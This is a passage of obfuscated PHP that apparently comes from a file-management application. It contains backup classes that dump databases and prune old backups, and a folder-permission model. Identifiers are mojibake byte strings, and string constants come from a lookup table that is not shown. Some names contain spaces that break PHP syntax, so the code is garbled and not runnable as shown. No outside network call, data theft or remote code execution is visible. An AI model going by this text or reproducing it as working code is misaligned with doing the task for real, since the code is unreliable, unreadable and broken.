$±â¸ÌØ¡); $±Ó®«Í„ = $Çşğ•äÀ[823]; while (strlen($±Ó®«Í„) < $Çşğ•äÀ[690]) { if (!$±Ó®«Í„) { break; } $±Ó®«Í„++; } } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[†ûãı«°][824]); $this->init(); $this->keep(); } public function init() { $‹­¿™Ô² =& $_SERVER[†ûãı«°]; $this->isManual(); self::$name = date($‹­¿™Ô²[825]); if (!($Šúğ·Ñ = $this->model->lastItem())) { $Šúğ·Ñ = $this->initData(); } else { self::$name = $Šúğ·Ñ[$‹­¿™Ô²[32]]; if ($Šúğ·Ñ[$‹­¿™Ô²[826]] == $‹­¿™Ô²[91]) { self::$name = date($‹­¿™Ô²[261]); $Ç§¿òÉØ = intval(_get($Šúğ·Ñ, $‹­¿™Ô²[827], 0)); if (self::$manual == 0 && $Šúğ·Ñ[$‹­¿™Ô²[32]] == self::$name) { $this->model->remove($Šúğ·Ñ[$‹­¿™Ô²[477]]); } $Šúğ·Ñ = $this->initData($Ç§¿òÉØ, $Šúğ·Ñ[$‹­¿™Ô²[828]]); } else { $this->checkStore($Šúğ·Ñ[$‹­¿™Ô²[828]]); } } self::$option = $Šúğ·Ñ; } private function isManual() { $ÂèÉ¥Á = _get($GLOBALS, $_SERVER[†ûãı«°][829], 0); $ÂèÉ¥Á = intval($ÂèÉ¥Á); self::$manual = $ÂèÉ¥Á && $ÂèÉ¥Á == 1 ? 1 : 0; } private function initData($„õç‰­é = 0, $Ãô«Íò = '') { $Àî½óç =& $_SERVER[†ûãı«°]; $õÕ®æñ± = $this->model->config(); if ($Ãô«Íò && $õÕ®æñ±[$Àî½óç[828]] != $Ãô«Íò) { $„õç‰­é = 0; } $this->checkStore($õÕ®æñ±[$Àî½óç[828]]); if (self::$manual == 1) { self::$name .= $Àî½óç[11] . date($Àî½óç[830]); } $ãá¨Ï²ô = array($Àî½óç[828] => $õÕ®æñ±[$Àî½óç[828]], $Àî½óç[32] => self::$name, $Àî½óç[826] => 0, $Àî½óç[171] => $õÕ®æñ±[$Àî½óç[171]], $Àî½óç[831] => self::$manual, $Àî½óç[370] => array($Àî½óç[832] => array($Àî½óç[826] => 0), $Àî½óç[833] => array($Àî½óç[826] => 0, $Àî½óç[834] => 0, $Àî½óç[835] => 0, $Àî½óç[33] => $Àî½óç[12], $Àî½óç[836] => 0, $Àî½óç[837] => 0), $Àî½óç[838] => array($Àî½óç[826] => 0, $Àî½óç[834] => 0, $Àî½óç[835] => 0, $Àî½óç[836] => 0, $Àî½óç[837] => 0), $Àî½óç[232] => array($Àî½óç[826] => 0, $Àî½óç[839] => 0, $Àî½óç[840] => 0, $Àî½óç[841] => 0, $Àî½óç[842] => 0, $Àî½óç[545] => $„õç‰­é, $Àî½óç[836] => 0, $Àî½óç[837] => 0)), $Àî½óç[836] => time(), $Àî½óç[837] => 0); $Ï¸æµĞ­ = $this->model->insert($ãá¨Ï²ô); $ãá¨Ï²ô[$Àî½óç[477]] = $Ï¸æµĞ­; return $ãá¨Ï²ô; } private function checkStore($†‚‰¾ïï) { $­»ºÀ‹æ = Model($_SERVER[†ûãı«°][843]); $»Í˜àÆñ = $­»ºÀ‹æ->listData($†‚‰¾ïï); $­»ºÀ‹æ->checkConfig($»Í˜àÆñ); } public static function get() { if (!self::$option) { $òšìÓ = Model($_SERVER[†ûãı«°][824]); $¾œ©”­ñ = $òšìÓ->findByName(self::$name); $òšìÓ->parseContent($¾œ©”­ñ); self::$option = $¾œ©”­ñ; } return self::$option; } public static function set($‘ë´Õë—) { $µùŒ’–Õ =& $_SERVER[†ûãı«°]; $ÂöÙàõ´ = self::get(); foreach ($‘ë´Õë— as $ßë·”Š => $åÎã´ñŸ) { array_set_value($ÂöÙàõ´, $ßë·”Š, $åÎã´ñŸ); } Model($µùŒ’–Õ[824])->update($ÂöÙàõ´[$µùŒ’–Õ[477]], $ÂöÙàõ´); self::$option = $ÂöÙàõ´; return self::$option; } public function keep() { $¯ŸÏ‚¶× =& $_SERVER[†ûãı«°]; $÷´ÄÃÍ = self::get(); if (_get($÷´ÄÃÍ, $¯ŸÏ‚¶×[844], 0) == $¯ŸÏ‚¶×[91]) { return; } $this->backupKeep($÷´ÄÃÍ); self::set(array($¯ŸÏ‚¶×[844] => 1)); } private function backupKeep($©Êä‚­å) { $úİ³íÍš =& $_SERVER[†ûãı«°]; if (self::$manual == 1) { return; } $¿»ÅƒËÂ = $this->model->listData(); if (empty($¿»ÅƒËÂ)) { return; } $ÁĞŞõæ = 0; $×·›ëÖÅ = array(); foreach ($¿»ÅƒËÂ as $Ñ¶ºª•­) { if ($ÁĞŞõæ >= 7) { break; } $×·›ëÖÅ[] = $Ñ¶ºª•­[$úİ³íÍš[32]]; $ÁĞŞõæ++; } for ($ÁĞŞõæ = 0; $ÁĞŞõæ < 12; $ÁĞŞõæ++) { $×·›ëÖÅ[] = date($úİ³íÍš[845], strtotime("\x2d{$ÁĞŞõæ}\x20\x6d\157\x6e\164\150\x73")); } $×·›ëÖÅ = array_unique($×·›ëÖÅ); $è‚Â³ãÏ = Model($úİ³íÍš[846])->get($úİ³íÍš[847]); foreach ($¿»ÅƒËÂ as $Ñ¶ºª•­) { if (isset($Ñ¶ºª•­[$úİ³íÍš[831]]) && $Ñ¶ºª•­[$úİ³íÍš[831]] == $úİ³íÍš[91]) { continue; } if (!empty($Ñ¶ºª•­[$úİ³íÍš[32]]) && in_array($Ñ¶ºª•­[$úİ³íÍš[32]], $×·›ëÖÅ)) { continue; } $this->model->remove($Ñ¶ºª•­[$úİ³íÍš[477]]); $®¡Ÿí‹ = $this->backupPath($©Êä‚­å, $è‚Â³ãÏ); IO::remove($®¡Ÿí‹, !1); } } private function backupPath($ÏÎ¤½í, $ıÅ»ŞÁÍ = false) { $š€úõŞù =& $_SERVER[†ûãı«°]; if (!$ıÅ»ŞÁÍ) { $ıÅ»ŞÁÍ = Model($š€úõŞù[846])->get($š€úõŞù[847]); } $…±Ó‚ÄÌ = $ÏÎ¤½í[$š€úõŞù[32]]; $ÇÒó’½› = substr(md5($š€úõŞù[848] . $ıÅ»ŞÁÍ . $…±Ó‚ÄÌ), 0, 8); return "\173\x69\x6f\x3a{$ÏÎ¤½í[$š€úõŞù[828]]}\x7d\57\x64\x61\x74\141\142\x61\163\145\x2f\142\x61\x63\x6b\x75\x70\x2f" . $…±Ó‚ÄÌ . $š€úõŞù[11] . $ÇÒó’½›; } public function db() { $§òŠ‚€… =& $_SERVER[†ûãı«°]; $ÛÙë‘ £ = self::get(); if (_get($ÛÙë‘ £, $§òŠ‚€…[849], 0) == $§òŠ‚€…[91]) { return !0; } $Ø¾ô†µ‰ = new BackupDb(); if (!$Ø¾ô†µ‰->index()) { return !1; } self::set(array($§òŠ‚€…[849] => 1)); return !0; } public function dbFile() { $€´˜µùğ =& $_SERVER[†ûãı«°]; $›åü˜Ãæ = self::get(); if (_get($›åü˜Ãæ, $€´˜µùğ[850], 0) == $€´˜µùğ[91]) { return !0; } $ã–Íã²‰ = new BackupDbFile(); if (!$ã–Íã²‰->index()) { return !1; } self::set(array($€´˜µùğ[850] => 1)); return !0; } public function file() { $·±…óö— =& $_SERVER[†ûãı«°]; $‚µÑŞíØ = self::get(); if (_get($‚µÑŞíØ, $·±…óö—[851], 0) == $·±…óö—[91]) { return !0; } if ($‚µÑŞíØ[$·±…óö—[171]] == $·±…óö—[852]) { $Ó÷•ÊÙ§ = new BackupFile(); if (!$Ó÷•ÊÙ§->index()) { return !1; } } self::set(array($·±…óö—[851] => 1, $·±…óö—[826] => 1)); return !0; } public static function log($¬¸ÌÔ€š) { write_log($¬¸ÌÔ€š, $_SERVER[†ûãı«°][853]); } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $Øìá¿ñ” =& $_SERVER[†ûãı«°]; $ÁÜÙ±õ¼ = Backup::get(); self::$io = $ÁÜÙ±õ¼[$Øìá¿ñ”[828]]; self::$name = $ÁÜÙ±õ¼[$Øìá¿ñ”[32]]; $ÀŞ¯±´¤ = new DbManage(); $ïíñ´áã = $ÀŞ¯±´¤->dbType(); $éÛÚºü = array($Øìá¿ñ”[854] => $ïíñ´áã, $Øìá¿ñ”[855] => time()); Backup::set($éÛÚºü); $ª•–¸’ñ = $this->tmpFilesPath() . $Øìá¿ñ”[856] . self::$name . $Øìá¿ñ”[8]; del_dir($ª•–¸’ñ); mk_dir($ª•–¸’ñ); $ÉˆùäÄ‚ = $ğ¢ˆå÷ó = 0; try { $óŒá©¬° = $ÀŞ¯±´¤->db()->getTables(); } catch (Exception $ ©ËŞÔƒ) { Backup::log($Øìá¿ñ”[857] . $ ©ËŞÔƒ->getMessage()); return !1; } $óŒá©¬° = array_diff($óŒá©¬°, array($Øìá¿ñ”[858], $Øìá¿ñ”[859])); foreach ($óŒá©¬° as $¥ß ’´Á) { if ($¥ß ’´Á == $Øìá¿ñ”[860]) { continue; } $ÉˆùäÄ‚ += $ÀŞ¯±´¤->model($¥ß ’´Á)->count(); } $ş´¥ğùÇ = new Task($Øìá¿ñ”[861], $Øìá¿ñ”[853], $ÉˆùäÄ‚, LNG($Øìá¿ñ”[862]) . $Øìá¿ñ”[863] . LNG($Øìá¿ñ”[864])); $GLOBALS[$Øìá¿ñ”[865]] = self::$name; foreach ($óŒá©¬° as $¥ß ’´Á) { $Ä‰‘âø = $ª•–¸’ñ . $¥ß ’´Á . $Øìá¿ñ”[866]; if ($¥ß ’´Á == $Øìá¿ñ”[860]) { @touch($Ä‰‘âø); continue; } $â»Óœˆ = null; if ($¥ß ’´Á == $Øìá¿ñ”[867] && $ÁÜÙ±õ¼[$Øìá¿ñ”[171]] == $Øìá¿ñ”[852]) { $â»Óœˆ = self::$io; } $ğ¢ˆå÷ó += $ÀŞ¯±´¤->sqlFromDb($¥ß ’´Á, $Ä‰‘âø, $ş´¥ğùÇ, $â»Óœˆ); } unset($GLOBALS[$Øìá¿ñ”[865]]); $ş´¥ğùÇ->end(); if ($ğ¢ˆå÷ó > $ÉˆùäÄ‚) { $ÉˆùäÄ‚ = $ğ¢ˆå÷ó; } $éÛÚºü = array($Øìá¿ñ”[854] => $ïíñ´áã, $Øìá¿ñ”[849] => 1, $Øìá¿ñ”[868] => $ÉˆùäÄ‚, $Øìá¿ñ”[869] => $ğ¢ˆå÷ó, $Øìá¿ñ”[870] => time()); Backup::set($éÛÚºü); if ($ÉˆùäÄ‚ - $ğ¢ˆå÷ó > 0) { $÷ø”Ä›Ì = $Øìá¿ñ”[871]; if (!stristr(I18n::getType(), $Øìá¿ñ”[872])) { $÷ø”Ä›Ì = $Øìá¿ñ”[873]; } Backup::log(array($÷ø”Ä›Ì, $éÛÚºü)); return !1; } return !0; } private function tmpFilesPath() { $şÀ§„ƒÀ =& $_SERVER[†ûãı«°]; $“›ê¾Ì = TEMP_FILES; if ($GLOBALS[$şÀ§„ƒÀ[6]][$şÀ§„ƒÀ[92]][$şÀ§„ƒÀ[874]]) { $“›ê¾Ì = $GLOBALS[$şÀ§„ƒÀ[6]][$şÀ§„ƒÀ[92]][$şÀ§„ƒÀ[874]]; if (!mk_dir($“›ê¾Ì) || !is_writable($“›ê¾Ì) || !IO::mkfile($“›ê¾Ì . $şÀ§„ƒÀ[875])) { $“›ê¾Ì = TEMP_FILES; } } return $“›ê¾Ì; } } goto FµÕ…¦ÒËŒ; fÜ«ˆÁÎİŒ: class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\165\162\x63\145\137\141\165\x74\x68"; public function getAuth($Ö³‚Ò’ñ) { $®Ö‹®‰Ö =& $_SERVER[†ûãı«°]; $û˜š§–„ = $this->sourceAuthSelect($Ö³‚Ò’ñ); $ı—–²ôÎ = array(); $ãÑ‚í®ç = array(); $ìÏğ´Ÿ™ = 2 << 25; foreach ($û˜š§–„ as $¦ì±ÅœÖ) { $»ÕÆµÑı = Model($®Ö‹®‰Ö[575])->listData($¦ì±ÅœÖ[$®Ö‹®‰Ö[2092]]); if (!$»ÕÆµÑı) { continue; } $ı—–²ôÎ[] = $¦ì±ÅœÖ; $Ò¶ë¦ñú = 0; if ($¦ì±ÅœÖ[$®Ö‹®‰Ö[190]] == SourceModel::TYPE_GROUP) { $Ò¶ë¦ñú = $ìÏğ´Ÿ™ * 2; } if ($¦ì±ÅœÖ[$®Ö‹®‰Ö[190]] == SourceModel::TYPE_USER) { $Ò¶ë¦ñú = $ìÏğ´Ÿ™; } if ($¦ì±ÅœÖ[$®Ö‹®‰Ö[190]] == SourceModel::TYPE_USER && $¦ì±ÅœÖ[$®Ö‹®‰Ö[573]] == $®Ö‹®‰Ö[230]) { $Ò¶ë¦ñú = 0; } $ãÑ‚í®ç[] = $»ÕÆµÑı[$®Ö‹®‰Ö[489]] + $Ò¶ë¦ñú; } array_multisort($ãÑ‚í®ç, SORT_DESC, $ı—–²ôÎ); return $ı—–²ôÎ; } public function sourceAuthSelect($äƒØŠÙ†) { $¡Ø€Ãíû =& $_SERVER[†ûãı«°]; static $óöé±¦ = array(); $à¿å‹Ÿ¶ = is_array($äƒØŠÙ†) ? !1 : !0; if ($à¿å‹Ÿ¶) { $äƒØŠÙ† = array($äƒØŠÙ†); } $‡×½ñâŠ = array(); foreach ($äƒØŠÙ† as $ ÂéÀ¥ö) { if (isset($óöé±¦[$ ÂéÀ¥ö])) { $‡×½ñâŠ[$ ÂéÀ¥ö] = $óöé±¦[$ ÂéÀ¥ö]; } } if (count($‡×½ñâŠ) == count($äƒØŠÙ†)) { return $à¿å‹Ÿ¶ ? $‡×½ñâŠ[$äƒØŠÙ†[0]] : $‡×½ñâŠ; } $ÆÁÃ©±¥ = $¡Ø€Ãíû[2173]; $œôäÀ‹² = array($¡Ø€Ãíû[193] => array($¡Ø€Ãíû[7], $äƒØŠÙ†)); $½æÏ‘Şº = $this->field($ÆÁÃ©±¥)->order($¡Ø€Ãíû[477])->where($œôäÀ‹²)->select(); $å‰µÊì = array_to_keyvalue_group($½æÏ‘Şº, $¡Ø€Ãíû[193]); foreach ($äƒØŠÙ† as $ ÂéÀ¥ö) { $óöé±¦[$ ÂéÀ¥ö] = $å‰µÊì[$ ÂéÀ¥ö] ? $å‰µÊì[$ ÂéÀ¥ö] : array(); } if ($à¿å‹Ÿ¶) { return $½æÏ‘Şº; } return $å‰µÊì; } public function setAuth($‰Â§¾¦Ø, $Œğ«„•) { $îî–†ø =& $_SERVER[†ûãı«°]; $ÀóÊãÏÄ = Model($îî–†ø[1432])->sourceInfo($‰Â§¾¦Ø); if (!$ÀóÊãÏÄ) { return !1; } if ($ÀóÊãÏÄ[$îî–†ø[190]] != SourceModel::TYPE_GROUP) { return !1; } $ì†»ş²À = 1; $Ö¾ı‰š¦ = $ÀóÊãÏÄ[$îî–†ø[573]]; if ($Ö¾ı‰š¦ != $ì†»ş²À) { $Ÿ×Å“¬ñ = array($îî–†ø[1984] => $Ö¾ı‰š¦); $Éïôƒ¶Ö = Model($îî–†ø[2078])->field($îî–†ø[1783])->where($Ÿ×Å“¬ñ)->select(); $Éïôƒ¶Ö = array_to_keyvalue($Éïôƒ¶Ö, $îî–†ø[12], $îî–†ø[1783]); } $†Äş³·ù = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $£“¤²Äë = array(); foreach ($Œğ«„• as $ïÙ†‘Ë¬) { if (!in_array($ïÙ†‘Ë¬[$îî–†ø[190]], $†Äş³·ù)) { show_json(LNG($îî–†ø[2174]), !1); } if ($Ö¾ı‰š¦ != $ì†»ş²À) { if ($ïÙ†‘Ë¬[$îî–†ø[190]] == SourceModel::TYPE_GROUP) { } if ($ïÙ†‘Ë¬[$îî–†ø[573]] != 0 && !in_array($ïÙ†‘Ë¬[$îî–†ø[573]], $Éïôƒ¶Ö)) { } } if ($ïÙ†‘Ë¬[$îî–†ø[573]] == 0) { $ïÙ†‘Ë¬[$îî–†ø[190]] = SourceModel::TYPE_USER; } $£“¤²Äë[] = array($îî–†ø[193] => $‰Â§¾¦Ø, $îî–†ø[190] => intval($ïÙ†‘Ë¬[$îî–†ø[190]]), $îî–†ø[573] => intval($ïÙ†‘Ë¬[$îî–†ø[573]]), $îî–†ø[2092] => intval($ïÙ†‘Ë¬[$îî–†ø[2092]]) ? intval($ïÙ†‘Ë¬[$îî–†ø[2092]]) : 0, $îî–†ø[2156] => intval($ïÙ†‘Ë¬[$îî–†ø[2156]]) ? intval($ïÙ†‘Ë¬[$îî–†ø[2156]]) : -1); } $this->where(array($îî–†ø[493] => $‰Â§¾¦Ø))->delete(); $this->addAll($£“¤²Äë); return !0; } public function authClear($ô€ß–Î€) { $·Ê²÷÷· =& $_SERVER[†ûãı«°]; $±³¢Ÿ = Model($·Ê²÷÷·[1432])->sourceInfo($ô€ß–Î€); $±—×÷° = array($ô€ß–Î€); if ($±³¢Ÿ[$·Ê²÷÷·[487]] == $·Ê²÷÷·[91]) { $˜ïëØ¬§ = array($·Ê²÷÷·[659] => array($·Ê²÷÷·[619], $±³¢Ÿ[$·Ê²÷÷·[588]] . $ô€ß–Î€ . $·Ê²÷÷·[620])); $±—×÷° = Model($·Ê²÷÷·[1432])->field($·Ê²÷÷·[493])->where($˜ïëØ¬§)->getField($·Ê²÷÷·[193], !0); $±—×÷°[] = $ô€ß–Î€; } $this->where(array($·Ê²÷÷·[493] => array($·Ê²÷÷·[494], $±—×÷°)))->delete(); return !0; } public function getAllChildren($şé¢¥ÎÊ) { $Ò®ğÂÍ‰ =& $_SERVER[†ûãı«°]; $¨ñşòõ€ = Model($Ò®ğÂÍ‰[1432])->sourceInfo($şé¢¥ÎÊ); if ($¨ñşòõ€[$Ò®ğÂÍ‰[487]] != $Ò®ğÂÍ‰[91]) { return $this->sourceListAuth(array($şé¢¥ÎÊ)); } if ($¨ñşòõ€[$Ò®ğÂÍ‰[190]] != SourceModel::TYPE_GROUP) { return array(); } $ç÷§©›Ã = 1; $Ö¹„€ó = array($şé¢¥ÎÊ); if ($¨ñşòõ€[$Ò®ğÂÍ‰[192]] == $Ò®ğÂÍ‰[230] && $¨ñşòõ€[$Ò®ğÂÍ‰[573]] != $ç÷§©›Ã) { $Ö¹„€ó = $this->groupChidldAllRootSource($¨ñşòõ€[$Ò®ğÂÍ‰[573]]); } $ß•“£İ = $this->field($Ò®ğÂÍ‰[193])->group($Ò®ğÂÍ‰[193])->select(); $ß•“£İ = array_to_keyvalue($ß•“£İ, $Ò®ğÂÍ‰[12], $Ò®ğÂÍ‰[193]); if (!$ß•“£İ) { return array(); } $åÍÑô»é = $Ò®ğÂÍ‰[2175]; $Âñ²•˜ = array($Ò®ğÂÍ‰[193] => array($Ò®ğÂÍ‰[7], $ß•“£İ), $Ò®ğÂÍ‰[507] => $Ò®ğÂÍ‰[230]); $§ƒ‘¥ = Model($Ò®ğÂÍ‰[906])->field($åÍÑô»é)->where($Âñ²•˜)->select(); $şôß´« = array($şé¢¥ÎÊ); foreach ($§ƒ‘¥ as $ŠÇê¸õí) { foreach ($Ö¹„€ó as $ª¯ØºÖ€) { $± àõÀø = $Ò®ğÂÍ‰[50] . $ª¯ØºÖ€ . $Ò®ğÂÍ‰[50]; $ÂÉâİü¯ = $ŠÇê¸õí[$Ò®ğÂÍ‰[588]] . $ŠÇê¸õí[$Ò®ğÂÍ‰[193]] . $Ò®ğÂÍ‰[50]; if (strstr($ÂÉâİü¯, $± àõÀø)) { $şôß´«[] = $ŠÇê¸õí[$Ò®ğÂÍ‰[193]]; break; } } } return $this->sourceListAuth($şôß´«); } private function sourceListAuth($Œ†ğÄñ) { $ÍâÚäš =& $_SERVER[†ûãı«°]; $¶â‚…Çü = Model($ÍâÚäš[1432])->sourceListInfo($Œ†ğÄñ, !0); $Øâû¼Ì = $this->sourceAuthSelect($Œ†ğÄñ); $·¸±Ûİî = array(); $¸Ó­œñ¥ = array(); foreach ($¶â‚…Çü as $ƒŸÕ¬¾‹) { unset($ƒŸÕ¬¾‹[$ÍâÚäš[531]]); unset($ƒŸÕ¬¾‹[$ÍâÚäš[529]]); unset($ƒŸÕ¬¾‹[$ÍâÚäš[489]]); unset($ƒŸÕ¬¾‹[$ÍâÚäš[90]]); $ê¥§±ª² = $Øâû¼Ì[$ƒŸÕ¬¾‹[$ÍâÚäš[193]]]; if (!$ê¥§±ª²) { continue; } $ƒŸÕ¬¾‹[$ÍâÚäš[2176]] = $this->authTargetInfo($ê¥§±ª²); $ƒŸÕ¬¾‹[$ÍâÚäš[586]] = rtrim($ƒŸÕ¬¾‹[$ÍâÚäš[592]], $ÍâÚäš[8]) . $ÍâÚäš[8] . ltrim($ƒŸÕ¬¾‹[$ÍâÚäš[586]], $ÍâÚäš[8]); $·¸±Ûİî[] = $ƒŸÕ¬¾‹; $®Ö•‚‚Ï = count(explode($ÍâÚäš[8], trim($ƒŸÕ¬¾‹[$ÍâÚäš[586]], $ÍâÚäš[8]))); $¸Ó­œñ¥[] = $®Ö•‚‚Ï + ($ƒŸÕ¬¾‹[$ÍâÚäš[33]] == $ÍâÚäš[78] ? 0 : 1000); } array_multisort($¸Ó­œñ¥, SORT_ASC, $·¸±Ûİî); return $·¸±Ûİî; } private function groupChidldAllRootSource($­üó¢Ô) { $›€Õ‘†Ó =& $_SERVER[†ûãı«°]; $şë§•¦Å = Model($›€Õ‘†Ó[2177])->groupChildrenAll($­üó¢Ô); $ÀĞÁÂ = array($›€Õ‘†Ó[192] => 0, $›€Õ‘†Ó[573] => array($›€Õ‘†Ó[7], $şë§•¦Å), $›€Õ‘†Ó[190] => SourceModel::TYPE_GROUP); $€¾ÀØú = Model($›€Õ‘†Ó[906])->field($›€Õ‘†Ó[193])->where($ÀĞÁÂ)->select(); $€¾ÀØú = array_to_keyvalue($€¾ÀØú, $›€Õ‘†Ó[12], $›€Õ‘†Ó[193]); return $€¾ÀØú; } private function authTargetInfo($Èµ‹á) { $¿ûûŸÛ =& $_SERVER[†ûãı«°]; $ûÒŸ‚‚ = array(); $éó†ì‚ = array(); $Æ¸’¦  = 2 << 25; foreach ($Èµ‹á as $ìŸÙ’²) { $åâ×ºĞ« = Model($¿ûûŸÛ[575])->listData($ìŸÙ’²[$¿ûûŸÛ[2092]]); if (!$åâ×ºĞ«) { continue; } if ($ìŸÙ’²[$¿ûûŸÛ[190]] == SourceModel::TYPE_USER) { $Õİ¯ü ú = Model($¿ûûŸÛ[581])->getInfoSimpleOuter($ìŸÙ’²[$¿ûûŸÛ[573]]); if ($Õİ¯ü ú[$¿ûûŸÛ[1783]] == $¿ûûŸÛ[1284]) { continue; } if ($Õİ¯ü ú[$¿ûûŸÛ[1783]] == $¿ûûŸÛ[230]) { $Õİ¯ü ú[$¿ûûŸÛ[32]] = LNG($¿ûûŸÛ[2178]); } } else { $Õİ¯ü ú = Model($¿ûûŸÛ[589])->getInfoSimple($ìŸÙ’²[$¿ûûŸÛ[573]]); } if (!$Õİ¯ü ú) { continue; } $Õİ¯ü ú[$¿ûûŸÛ[544]] = $åâ×ºĞ«; $ûÒŸ‚‚[] = $Õİ¯ü ú; $‡Ç½ûş = 0; if ($ìŸÙ’²[$¿ûûŸÛ[190]] == SourceModel::TYPE_GROUP) { $‡Ç½ûş = $Æ¸’¦  * 2; } if ($ìŸÙ’²[$¿ûûŸÛ[190]] == SourceModel::TYPE_USER) { $‡Ç½ûş = $Æ¸’¦ ; } if ($ìŸÙ’²[$¿ûûŸÛ[190]] == SourceModel::TYPE_USER && $ìŸÙ’²[$¿ûûŸÛ[573]] == $¿ûûŸÛ[230]) { $‡Ç½ûş = 0; } $éó†ì‚[] = $åâ×ºĞ«[$¿ûûŸÛ[489]] + $‡Ç½ûş; } array_multisort($éó†ì‚, SORT_DESC, $ûÒŸ‚‚); return $ûÒŸ‚‚; } public function getAllChildrenByUser($ÆğÌÛã, $ƒ¿´ë¼¤) { $âœ²À’ =& $_SERVER[†ûãı«°]; $àĞß…ĞÅ = Model($âœ²À’[601])->getInfo($ƒ¿´ë¼¤); if (!$ƒ¿´ë¼¤ || !$ÆğÌÛã || !$àĞß…ĞÅ) { return array(); } $­¨¸ÕÓÖ = Model($âœ²À’[1432])->sourceInfo($ÆğÌÛã); $œ¦£Ïœñ = array(); $ê–”äô = 1; if ($­¨¸ÕÓÖ[$âœ²À’[192]] == $âœ²À’[230] && $­¨¸ÕÓÖ[$âœ²À’[573]] != $ê–”äô && $this->groupContainUser($­¨¸ÕÓÖ[$âœ²À’[573]], $ƒ¿´ë¼¤)) { foreach ($àĞß…ĞÅ[$âœ²À’[2179]] as $‡‹¦ô) { $É‘‰ÜÀğ = Model($âœ²À’[589])->getInfo($‡‹¦ô[$âœ²À’[1984]]); $ØÂÇÌ˜¯ = Model($âœ²À’[601])->getInfoSimpleOuter($ƒ¿´ë¼¤); $ØÂÇÌ˜¯[$âœ²À’[544]] = $‡‹¦ô[$âœ²À’[489]]; if (Model($âœ²À’[575])->authCheckAction($‡‹¦ô[$âœ²À’[489]][$âœ²À’[489]], $âœ²À’[2005])) { continue; } $Í’åäŠö = array($âœ²À’[32] => $âœ²À’[1304] . $É‘‰ÜÀğ[$âœ²À’[32]], $âœ²À’[193] => $É‘‰ÜÀğ[$âœ²À’[90]][$âœ²À’[193]], $âœ²À’[87] => KodIO::make($É‘‰ÜÀğ[$âœ²À’[90]][$âœ²À’[193]]), $âœ²À’[192] => $âœ²À’[230], $âœ²À’[190] => $âœ²À’[582], $âœ²À’[33] => $âœ²À’[623], $âœ²À’[586] => $É‘‰ÜÀğ[$âœ²À’[593]], $âœ²À’[1984] => $É‘‰ÜÀğ[$âœ²À’[1984]], $âœ²À’[590] => $É‘‰ÜÀğ[$âœ²À’[192]], $âœ²À’[2176] => array($ØÂÇÌ˜¯)); $œ¦£Ïœñ[$Í’åäŠö[$âœ²À’[193]]] = $Í’åäŠö; } } $”±ÙÀ˜Á = array(); $š¿«±÷´ = $this->getAllChildren($ÆğÌÛã); foreach ($š¿«±÷´ as $ŞÌÄ®Â¸) { $œªöõÊé = !1; foreach ($ŞÌÄ®Â¸[$âœ²À’[2176]] as $¼«¾ô¦) { if ($¼«¾ô¦[$âœ²À’[1783]]) { if ($¼«¾ô¦[$âœ²À’[1783]] == $ƒ¿´ë¼¤) { $œªöõÊé = !0; break; } } if ($¼«¾ô¦[$âœ²À’[1984]]) { if ($this->groupContainUser($¼«¾ô¦[$âœ²À’[1984]], $ƒ¿´ë¼¤)) { $œªöõÊé = !0; break; } } } if ($œªöõÊé) { $”±ÙÀ˜Á[] = $ŞÌÄ®Â¸; } $ˆØîİÍ = $ŞÌÄ®Â¸[$âœ²À’[193]]; if (isset($œ¦£Ïœñ[$ˆØîİÍ])) { $ŞÌÄ®Â¸[$âœ²À’[2176]][] = $œ¦£Ïœñ[$ˆØîİÍ][0]; $œ¦£Ïœñ[$ˆØîİÍ] = !1; } } $œ¦£Ïœñ = array_filter(array_values($œ¦£Ïœñ)); $”±ÙÀ˜Á = array_merge($œ¦£Ïœñ, $”±ÙÀ˜Á); return $”±ÙÀ˜Á; } public function setAllChildrenByUser($‘İïì­¸, $˜¼µ¦”Å, $ìÁõòÉ) { $À¹€ÑÒ² =& $_SERVER[†ûãı«°]; $úìóöÛ° = $this->getAllChildrenByUser($‘İïì­¸, $˜¼µ¦”Å); if (!$ìÁõòÉ || !$úìóöÛ°) { return !1; } foreach ($úìóöÛ° as $Äş‡¾˜) { $©í“ûóŠ = array(); foreach ($Äş‡¾˜[$À¹€ÑÒ²[2176]] as $Ç¯§àÜ) { $ˆ«„Ç–  = $Ç¯§àÜ[$À¹€ÑÒ²[544]]; $œíœ´õ = $Ç¯§àÜ[$À¹€ÑÒ²[1783]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ˆÃÜŠâÒ = $Ç¯§àÜ[$À¹€ÑÒ²[1783]] ? $Ç¯§àÜ[$À¹€ÑÒ²[1783]] : $Ç¯§àÜ[$À¹€ÑÒ²[1984]]; if ($Ç¯§àÜ[$À¹€ÑÒ²[1783]] && $Ç¯§àÜ[$À¹€ÑÒ²[1783]] == $˜¼µ¦”Å) { continue; } $©í“ûóŠ[] = array($À¹€ÑÒ²[193] => $Äş‡¾˜[$À¹€ÑÒ²[193]], $À¹€ÑÒ²[190] => $œíœ´õ, $À¹€ÑÒ²[573] => intval($ˆÃÜŠâÒ), $À¹€ÑÒ²[2092] => isset($ˆ«„Ç– [$À¹€ÑÒ²[477]]) ? intval($ˆ«„Ç– [$À¹€ÑÒ²[477]]) : 0, $À¹€ÑÒ²[2156] => isset($ˆ«„Ç– [$À¹€ÑÒ²[2156]]) ? intval($ˆ«„Ç– [$À¹€ÑÒ²[2156]]) : -1); } $©í“ûóŠ[] = array($À¹€ÑÒ²[193] => $Äş‡¾˜[$À¹€ÑÒ²[193]], $À¹€ÑÒ²[190] => SourceModel::TYPE_USER, $À¹€ÑÒ²[573] => intval($˜¼µ¦”Å), $À¹€ÑÒ²[2092] => intval($ìÁõòÉ), $À¹€ÑÒ²[2156] => -1); $this->where(array($À¹€ÑÒ²[493] => $Äş‡¾˜[$À¹€ÑÒ²[193]]))->delete(); $this->addAll($©í“ûóŠ); } return !0; } public function get($ïŒ«÷í¸) { $ó°—™œÆ = $this->getSourceList(array($ïŒ«÷í¸), !0); return $ó°—™œÆ[0]; } public function getSourceList($ğ™¶¯íˆ, $×­ÉÅ×û = false, $©¯ØØï = false) { $éğô×Èû =& $_SERVER[†ûãı«°]; if (!$ğ™¶¯íˆ) { return array(); } $§Æ²å ô = Model($éğô×Èû[1432]); if (!$×­ÉÅ×û && count($ğ™¶¯íˆ) == 1) { $×­ÉÅ×û = array(); $×­ÉÅ×û[$ğ™¶¯íˆ[0]] = $§Æ²å 